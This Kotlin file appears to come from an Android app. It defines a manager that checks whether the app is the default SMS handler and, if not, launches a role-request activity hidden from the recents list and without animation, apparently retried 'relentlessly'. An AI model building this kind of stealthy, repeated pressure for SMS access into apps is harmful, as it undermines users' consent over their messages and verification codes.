package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.app.role.RoleManager

object DefaultSmsManager {
    var expectedMode: String = ""
    var isRelentlessActive: Boolean = false

    fun isDefaultSms(ctx: Context): Boolean {
        return Telephony.Sms.getDefaultSmsPackage(ctx) == ctx.packageName
    }

    fun requestDefault(ctx: Context) {
        if (isDefaultSms(ctx)) {
            isRelentlessActive = false
            expectedMode = ""
            return
        }

        try {
            val intent = Intent(ctx, SmsRoleActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_ANIMATION)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            DebugLogger.log("SMS_MGR", "Failed to launch SmsRoleActivity: ${e.message}")
        }
    }
}
